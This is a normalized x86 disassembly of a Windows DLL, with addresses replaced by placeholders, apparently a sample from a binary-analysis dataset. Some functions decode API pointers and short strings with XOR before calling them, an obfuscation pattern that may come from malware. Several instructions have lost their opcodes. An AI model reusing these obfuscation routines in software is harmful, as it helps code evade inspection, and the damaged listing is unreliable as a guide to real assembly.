mov eax [ esi ]
mov [ edi ] eax
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
lea eax [ eax + eax + 0x2 ]
push eax
push esi
push edi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
sub_10027fc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088e39
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor edi edi
push edi
mov esi ecx
mov ebx edx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push esi
mov ecx ebx
call sub_10041710
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] edi
mov [ ebp - 0x9c ] edi
call sub_10023120
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0xa0 ]
cmp edx edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x3d
call sub_10045930
lea eax [ ebp - 0x98 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x60 ]
lea esi [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x14
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x68 ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor edx edx
mov ebx 0x7
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x7c ] dx
cmp [ ebp - 0x84 ] esi
jb r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
xor ecx ecx
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x98 ] cx
cmp esi edi
je r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_100281cd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10035d06
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10028210
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xa
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_100282e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
cmp [ ebx ] 0x0
push edi
mov edi [ rw-data ]
jne r-xdata
add edi 0xd4
push esi
lea eax [ ebp - 0x4 ]
mov ecx edi
call sub_10027580
mov esi [ eax ]
mov eax [ rw-data ]
cmp esi [ eax + 0xd8 ]
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
push eax
call [ UnmapViewOfFile@IAT ]
mov ecx [ esi + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
push esi
lea edx [ ebp - 0x4 ]
push edx
push edi
mov [ ebx ] 0x0
call sub_10028360
pop esi
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
sub_10028360
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_10069ec0
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_1002d84e
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_100187af
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_10062b90
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_1004d420
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10062e20
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_1004d420
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10062e20
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10062e20
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_1004d420
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_100285c0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcb
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x1
xor eax eax
lea edx [ esi + 0x13c ]
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] ax
call sub_100028a0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x4b
call sub_10053240
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10028650
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b78
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xb8 ] bl
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_10069020
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xbc ] ebx
mov eax [ esi + 0xc4 ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] ebx
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] ebx
sub_100286f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_10024fe9
int3
sub_10028730
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop esi
pop ebp
retn
push edi
jmp r-xdata
movzx eax [ esi ]
mov edi [ ebp + 0xc ]
push eax
call sub_1002fb3f
mov [ edi ] ax
add [ ebp + 0xc ] 0x2
add esi 0x2
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_10028790
push ecx
cmp [ edi ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
pop ecx
retn
mov eax [ edi ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
test ebx ebx
jne r-xdata
push esi
call sub_10039ba0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100287cc
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1002887f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_100288b0
mov [ esi ] r--data
push ebx
xor ebx ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esi + 0x384 ] ebx
mov [ esi + 0x39c ] 0x1
mov [ esi + 0x3a0 ] ebx
mov [ esi + 0x3a4 ] ebx
mov [ esi + 0x3a8 ] ebx
mov [ esi + 0x3b0 ] ebx
mov [ esi + 0x3b4 ] ebx
mov [ esi + 0x3b8 ] ebx
mov [ esi + 0x3c0 ] ebx
mov [ esi + 0x3c4 ] ebx
mov [ esi + 0x3c8 ] ebx
mov [ esi + 0x3d0 ] ebx
call [ GetCurrentThreadId@IAT ]
push rw-data
mov [ esi + 0x374 ] eax
mov [ esi + 0x37c ] 0x1
call [ InterlockedIncrement@IAT ]
mov [ esi + 0x378 ] eax
mov [ esi + 0x380 ] ebx
mov eax esi
pop ebx
retn
sub_10028950
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1000831a
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_1003f800
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100187af
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_1007f5d0
add esp 0xc
sub_10028a00
push ebp
mov ebp esp
push 0xffffffff
push sub_1008643b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x20
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
push eax
mov ecx esi
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100461c0
jmp r-xdata
sub_10028ac0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
lea edi [ eax + 0x1 ]
mov [ ebp - 0x20 ] edi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_1000b33e
add esp 0x4
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_10082ff0
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
push eax
call sub_10035950
and eax 0xffff
or eax 0x80070000
test ebx ebx
jne r-xdata
push esi
push ebx
push edi
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_10035950
push ebx
call [ SysAllocString@IAT ]
mov edi eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test edi edi
jne r-xdata
push ebx
call sub_10035d06
add esp 0x4
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push ebx
call sub_10035d06
add esp 0x4
mov eax edi
push 0x8007000e
call sub_10035950
push eax
call sub_10035950
and eax 0xffff
or eax 0x80070000
sub_10028c50
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10028cba
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_1006299d
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_1002b306
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_10019714
add esp 0x24
leave
retn
sub_10028d20
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0x126
call sub_10053240
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_10023d8f
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_1007f940
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x14 ]
push 0x2e
push esi
call sub_10023d8f
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x7c
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_1007f5d0
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa2
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x50 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_10023d8f
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10028eb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1001da0a
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000206b
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10032374
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
